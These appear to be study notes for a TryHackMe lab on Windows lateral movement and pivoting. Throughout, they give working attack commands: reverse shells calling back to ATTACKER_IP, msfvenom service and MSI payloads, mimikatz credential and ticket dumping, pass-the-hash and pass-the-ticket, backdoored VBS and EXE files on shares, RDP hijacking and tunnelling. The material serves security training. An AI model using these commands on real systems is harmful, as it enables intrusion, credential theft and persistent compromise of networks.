# Lateral Movement and Pivoting
> [TryHackMe Link](https://tryhackme.com/room/lateralmovementandpivoting)


## Lateral Movement
This is a cycle step within the cyber killchain that looks at escalating privilege performing internal recon to move laterally and maintain presence before looking for availability to escalate privilege and repeat. 
- Moving laterally is part of a cycle in cyber kill chains where we repeat the cycle of escalating privileges -> Internal Recon -> Move Laterally -> Maintain Presence
- The simplest way to move laterally is using standard administrative protocols like WinRM, RDP, VNC or SSH to connect to other machines around the network

### [UAC](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction)
There are  two types of administrators: 
- **Local accounts** part of the local Administrators group
- **Domain accounts** part of the local Administrators group
The difference is through restrictions imposed by User Account Control (UAC) over local administrators (except for the default Administrator account).
- By default, local administrators won't be able to remotely connect to a machine and perform administrative tasks unless using an interactive session through RDP. 
- Windows denies any administrative task requested via **RPC**, **SMB** or **WinRM** since such administrators will be logged in with a *filtered medium integrity token* 

Domain accounts with local administration privileges won't be subject to the same treatment and will be logged in with full administrative privileges.
- This security feature can be disabled

## Remote Processs Spawning

### Psexec 

**Ports**: 445/TCP (SMB)
**Required Group Membership**: Administrators

Psexec works as follows:
1. Connect to Admin$ share and upload a service binary (psexesvc.exe)
2. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`
3. Create some named pipes to handle stdin/stdout/stderr and communicate through `\.\pipe\psexesvx\`

To run psexec, we only need to supply the required administrator credentials for the remote host and the command we want to run 
- `psexec64.exe \\MACHINE_IP -u Administrator -p PASSWORD -i cmd.exe`

### Remote Process Creation Using WinRM

**Ports**: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
**Required Group Membership**: Remote Management Users

To connect to a remote Powershell session from the command line:
- `winrs.exe -u:Administrator -p:Mypass123 -r:target cmd`

Powershell:
```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
Enter-PSSession -Computername TARGET -Credential $credential
OR 
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

### Creating Services Using sc

**Ports**:
    135/TCP, 49152-65535/TCP (DCE/RPC)
    445/TCP (RPC over SMB Named Pipes)
    139/TCP (RPC over SMB Named Pipes
**Required Group Membership**: Administrators

Windows services can also be leveraged to run arbitrary commands or applications since they execute a command when started. `sc` will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC in several way. This will play out the following protocol:
1. A connection attempt will be made using DCE/RPC. 
   1. Client will first connect to the Endpoint Mapper (EPM) at port 135 and will request information on the SVCCTL service program
   2. EPM (which serves a catalogue of available RPC endpoints) will then respond with the IP and port to connect to SVCCTL (*usually a dynamic port in the range of 49152-65535*)
   3. The client will RPC bind to SVCCTL
2. If the the RPC bind fails sc will try to reach out to through SMB named pipes on port 445 (SMB) or 139 (SMB over NetBIOS)
   
Services can be made using the commands: 
- `sc.exe \\TARGET create SERVICE_NAME binPath= "net user munra Pass123 /add" start= auto`
- `sc.exe \\TARGET start SERVICE_NAME`

> **Note**: Since the OS is in charge of starting the service there won't be a command output making it a blind attack

With this approach binaries can also be uploaded to the service for execution. However if a reverse shell is ran the shell disconnets after execution as service executables are different to standard .exe so they are killed by the service manager. msfvenom supports the `exe-service` format, which will encapsulate any payload we like inside a fully functional service executable
- `msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe`

`sc` doesn't allow for credentials as part of commands so `runas` is used to spawn a new shell using a user's access token but we need to use a second reverse shell to access a command prompt
- `runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"`

From here we could utilise `sc` to upload and use our msfvenom services
- `sc.exe \\TARGET create SERVICE_NAME binPath= "%windir%\myservice.exe" start=auto`
- ` sc.exe \\TARGET start SERVICE_NAME`

### Creating Scheduled Tasks Remotely
You can create and run one remotely with schtasks:
- `schtasks /s TARGET /RU "SYSTEM" /create /tn "TASK_NAME" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00`
- `schtasks /s TARGET /run /TN "TASK_NAME"`

> **Note**: The command sets the schedule type (/sc) to ONCE, which means the task is intended to be run only once at the specified time and date. This is a blind attack as the output won't be available to us

To delete a scheduled task:
- `schtasks /S TARGET /TN "TASK_NAME" /DELETE /F`


## Lateral Movement Using WMI
Windows Management Instrumentation is Windows implementation of Web-Based Enterprise Management (WBEM), an enterprise standard for accessing management information across devices. 

Firstly create a PSCredential object with our user and password. This object will be stored in the $credential variable and utilised throughout the techniques:
```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```
Establish a WMI session using either of the following protocols:
1. **DCOM**: RPC over IP using port 135/TCP and ports 49152-65535/TCP,
2. **Wsman**: WinRM connection using ports 985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

Establish a WMI session from Powershell:
- `$Opt = New-CimSessionOption -Protocol DCOM`
- `$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop`

`New-CimSessionOption` cmdlet is used to configure the connection options for the WMI session, including the connection protocol. The options and credentials are then passed to the New-CimSession cmdlet to establish a session against a remote host.

### Remote Process Creation Using WMI

**Ports**:
    135/TCP, 49152-65535/TCP (DCERPC)
    5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
**Required Group Membership**: Administrators

Remotely spawn a process from Powershell by sending a WMI request to the Win32_Process class to spawn the process under the session
- `$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";`
- `Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}`

Command prompt equivalent: `wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" `

### Creating Services Remotely with WMI

**Ports**:
    135/TCP, 49152-65535/TCP (DCERPC)
    5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
**Required Group Membership**: Administrators

Create services with WMI through Powershell:
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "SERVICE_NAME";
DisplayName = "SERVICE_NAME";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```
Start the service:
- `$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'SERVICE_NAME'"`
- `Invoke-CimMethod -InputObject $Service -MethodName StartService`

### Scheduled Tasks Remotely with WMI

**Ports**:
    135/TCP, 49152-65535/TCP (DCERPC)
    5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
**Required Group Membership**: Administrators

Create and execute scheduled tasks by using some cmdlets available in Windows default installations:
```
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "TASK_NAME"
Start-ScheduledTask -CimSession $Session -TaskName "TASK_NAME"
```
Delete the scheduled task: 
`Unregister-ScheduledTask -CimSession $Session -TaskName "TASK_NAME"`

### Installing MSI packages through WMI

**Ports**:
    135/TCP, 49152-65535/TCP (DCERPC)
    5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
**Required Group Membership**: Administrators

MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us by invoking Win32_Product class.

We can create an MSI reverse shell with msfvenom:
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi`
- This would then need to be uploaded to the target like using SMB
  - `smbclient -c 'put myinstaller.msi' -U USERNAME -W ZA '//TARGET/admin$/' Korine.1994`
  - Copying the payload to the ADMIN$ share, it will be available at C:\Windows\ on the server
- Establish a WMI session and invoke the install

Powershell:
- `Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}`

CMD:
- `wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi`

## Alternate Authentication 

### NTLM authentication

1. The client sends an authentication request to the server they want to access.
2. The server generates a random number and sends it as a challenge to the client.
3. The client combines his NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.
4. The server forwards both the challenge and the response to the Domain Controller for verification.
5. The domain controller uses the challenge to recalculate the response and compares it to the initial response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.
6. The server forwards the authentication result to the client.

> **Note**: This process applies when using a domain account. If a local account is used, the server can verify the response to the challenge itself without requiring interaction with the domain controller since it has the password hash stored locally on its SAM.

#### Pass the Hash

If extracting credentials from a host where attained priviliges have been acquired (i.e mimikatz) we get clear-text passwords or hashes that can be cracked or non-cracked NTLM password hashes. We can extract NTLM hashes in two ways from a host: 

**Extracting NTLM hashes from local SAM:**
- Extracts only hashes from local users on the machine

1. `mimikatz # privilege::debug`
2. `mimikatz # token::elevate`
3. `mimikatz # lsadump::sam`

**Extracting NTLM hashes from LSASS memory:**
- **LSASS** (Local Security Authority Subsystem Service) is a Windows process that enforces security policy and handles user authentication, storing credentials in memory.

- Extracts any NTLM hashes for local users and any domain user that has recently logged onto the machine.

1. `mimikatz # privilege::debug`
2. `mimikatz # token::elevate`
3. `mimikatz # sekurlsa::msv `

Use the extracted hashes to perform a PtH attack by using mimikatz to inject an access token for the victim user on a reverse shell
1. `mimikatz # token::revert`
2. `mimikatz # sekurlsa::pth /user:USERNAME /domain:TARGET /ntlm:HASH /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"`

> **Note:** We use `token::revert` to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work

There are different Linux tools which have built-in support to perform PtH using different protocols:
- `xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`
- `psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`
- `evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`

### Kerberos Authentication
How Kerberos authentication works on Windows networks:
1. User sends his **username and a timestamp encrypted** using a key derived from his password to the **Key Distribution Center (KDC)**, a service usually installed on the Domain Controller in charge of creating Kerberos tickets on the network.
2. KDC will create and send back a **Ticket Granting Ticket (TGT)**, allowing the user to request tickets to access specific services without passing their credentials to the services themselves. Along with the TGT, a **Session Key** is given to the user, which they will need to generate the requests that follow.
   1.  **TGT is encrypted using the krbtgt account's password hash**, so the user can't access its contents. The encrypted **TGT includes a copy of the Session Key** as part of its contents, and the KDC has no need to store the Session Key as it can recover a copy by decrypting the TGT if needed.
3.  Users want to connect to a service on the network they will use their TGT to ask the KDC for a **Ticket Granting Service (TGS)**. TGS are tickets that allow connection only to the specific service for which they were created. To request a TGS, the **user will send his username and a timestamp encrypted using the Session Key**, **along with the TGT and a Service Principal Name (SPN)**, which indicates the service and server name we intend to access.
4.  KDC will send us a **TGS and a Service Session Key**, which we will need to authenticate to the service we want to access. The **TGS is encrypted using the Service Owner Hash** maintained by the KDC and the Service Session Key is encrypted with the session key. The Service Owner is the user or machine account under which the service runs. The TGS contains a copy of the Service Session Key on its encrypted contents so that the Service Owner can access it by decrypting the TGS.
5.  **User sends encrypted TGS and username + timestamp encrypted with Service Session Key** to the desired service to authenticate and establish a connection. The service will use its configured account's password hash to decrypt the TGS and validate the Service Session Key.

#### Pass the Ticket
Extract Kerberos tickets and session keys from LSASS memory using mimikatz (this process usually requires SYSTEM privileges on the attacked machine). Both the ticket and corresponding session key are needed.
1. `mimikatz # privilege::debug`
2. `mimikatz # sekurlsa::tickets /export`

mimikatz can extract any TGT or TGS available from the memory of the LSASS process. 
- Most interesting are TGTs as they can be used to request access to any services the user is allowed to access
- Extracting TGTs will require us to have administrator's credentials, and extracting TGSs can be done with a low-privileged account

Inject the tickets into the current session with the following command, check if the tickets were correctly injected with the `klist` command:
- `mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi`

#### Overpass-the-hash / Pass-the-Key

Attack is similar to PtH but applied to Kerberos networks. When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. The algorithm used to derive this key can be either DES (disabled by default on current Windows versions), RC4, AES128 or AES256, depending on the installed Windows version and Kerberos configuration. If we have any of those keys, we can ask the for a TGT without requiring the actual password.
1. obtain the Kerberos encryption keys from memory by using mimikat
   1. `mimikatz # privilege::debug`
   2. `mimikatz # sekurlsa::ekeys`
2. Following commands on mimikatz to get a reverse shell via Pass-the-Key (replacing HASH with one of the examples below)
   1. `mimikatz # sekurlsa::pth /user:Administrator /domain:TARGET /HASH /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"`
3. RC4 hash: `/rc4:96ea24eff4dff1fbe13818fbf12ea7d8`
4. AES128 hash: `/aes128:b65ea8151f13a31d01377f5934bf3883`
5. AES256 hash: `/aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65`

> **Note**: RC4 the key is equal to the NTLM hash of a user meaning we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols (known as a **Overpass-the-Hash (OPtH) attack**)

## Abusing User Behaviour
Taking advantage of actions performed by users to gain further access to machines in the network

### Abusing Writable Shares
Finding writable network shares to plant specific files to force users into executing any arbitrary payload and gain access to their machines. Like finding a shortcut to a script or executable file hosted on a network share.

The rationale behind this is that the administrator can maintain an executable on a network share, and users can execute it without copying or installing the application to each user's machine. Although when a user opens the shortcut on his workstation, the executable will be copied from the server to its `%temp%` folder and executed on the workstation. If attackers have write permissions over such scripts or executables any payload will run in the context of the final user's workstation (and logged-in user account).

### Backdooring .vbs Scripts
If the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code 
- `CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\IP\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True`

### Backdooring .exe Files
Download it from the share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently
- `msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`
- resulting puttyX.exe will execute a reverse_tcp meterpreter payload. Replace the executable on the windows share and wait for any connections using the exploit/multi/handler module from Metasploit.

### RDP hijacking
RDP sessions which are closed instead of the RDP client logging off are remained open on the server indefinitely. With SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.

With administrator-level access, we can get SYSTEM by any method like opening cmd as administrator and running psexec and list existing sessions
- `PsExec64.exe -s cmd.exe`
- `query user`
  - This command would list all users with a session open (shown by any session with a Disc status) 
- `tscon ID /dest:SESSIONNAME`
  - tscon will let us connect to session if we specify the session ID we will be taking over, as well as our current SESSIONNAME

## Port Forwarding
Port forwarding techniques consist of using any compromised host as a jump box to pivot to other hosts.

### SSH Tunnelling
Assume control has been gained over a compromised PC (without administrator access) and would like to use it as a pivot to access a port on another machine to which we can't directly connect. 
1. Start a tunnel from the PC, acting as an SSH client, to the Attacker's PC acting as an SSH server. The reason to do so is that you'll often find an SSH client on Windows machines, but no SSH server will be available most of the time
2. Making a connection back to our attacker's machine, we'll want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels
   1. `useradd tunneluser -m -d /home/tunneluser -s /bin/true`
   2. `passwd tunneluser`
3. SSH tunnel can be used to do either local or remote port forwarding

#### Remote Port Forewarding
Useful if firewall policies block the attacker's machine from directly accessing a port on a server but a compromised PC can access it. You can pivot to the port using remote port forwarding from PC by allowing you to take a reachable port from the SSH client and project it into a remote SSH server (the attacker's machine).

A port will be opened in the attacker's machine that can be used to connect back to the desired port in the server through the SSH tunnel. The comprimised PC will, in turn, proxy the connection so that the server will see all the traffic as if it was coming from the PC. 

To forward port 3389 on the server back to our attacker's machine, we can use the following command on PC. This will establish an SSH session from PC to `1.1.1.1` (Attacker PC) using the tunneluser user
- `ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N`
  - tunneluser isn't allowed to run a shell on the Attacker PC, we need to run the ssh command with the -N switch to prevent the client from requesting one ot the connection will terminate
  - `-R` switch is used to request a remote port forward. The syntax requires us first to indicate the port we will be opening at the SSH server (3389), followed by a colon and then the IP and port of the socket we'll be forwarding
  - The command itself won't output anything, but the tunnel will depend on the command to be running

We can then RDP on the attacker's machine to reach the server
- `xfreerdp /v:127.0.0.1 /u:User /p:Password`

#### Local Port Forwarding 
Allows us to "pull" a port from an SSH server into the SSH client. Could be used to take any service available in our attacker's machine and make it available through a port on the compromised PC. Any host that can't connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host. 

To forward port 80 from the attacker's machine and make it available from PC
- `ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N`
  - `-L` option for local port forwarding
  - Requires us to indicate the local socket used by PC to receive connections (*:80) and the remote socket to connect to from the attacker's PC perspective (127.0.0.1:80)
  - Use the IP address 127.0.0.1 in the second socket, as from the attacker's PC perspective, that's the host that holds the port 80 to be forwarded

Might need to add a firewall rule to allow for incoming connections on the PC (with dir=in). (Administrative privileges are needed for this) 
- `netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80`

### Port Forwarding With socat
When SSH is not available then `socat` allows you to forward ports in a simpler way, but this must be transfered to the pivot host. To perform port forwarding: 
1. `socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321`
  - open port 1234 on a host and forward any connection we receive there to port 4321 on host 1.1.1.1
  - `fork` option allows socat to fork a new process for each connection received, making it possible to handle multiple connections without closing
2. `socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389`
  - access port 3389 on the server using compromised PC as a pivot
  - socat will open a port on PC-1 that the attacker's machine can then connect to
  - Might need a firewall rule to allow for connections
3. `socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80`
  -  expose port 80 from the attacker's machine so that it is reachable by the server
  -  PC will spawn port 80 and listen for connections to be forwarded to port 80 on the attacker's machine

### Dynamic Port Forwarding and SOCKS
Allows us to pivot through a host and establish several connections to any IP addresses/ports we want by using a **SOCKS proxy**. Useful when needing to perform scans against many ports on host or many ports across many hosts through a pivot host.

Use the SSH client to establish a reverse dynamic port forwarding with the following command:
- `ssh tunneluser@1.1.1.1 -R 9050 -N`
  - SSH server will start a SOCKS proxy on port 9050, and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client.

Can use any of our tools through the SOCKS proxy by using **proxychains** if it is configured to point any connection to the same port used by SSH for the SOCKS proxy server. Modify `/etc/proxychains.conf`  to have: 
```
[ProxyList]
socks4  127.0.0.1 9050
```

Now to execute any command through the proxy, we can use proxychains:
- `proxychains curl http://URL`


## Tools
- [Sshuttle](https://github.com/sshuttle/sshuttle) 
- [Rpivot](https://github.com/klsecservices/rpivot)
- [Chisel](https://github.com/jpillora/chisel)
- [Hijacking Sockets with Shadowmove](https://adepts.of0x.cc/shadowmove-hijack-socket/)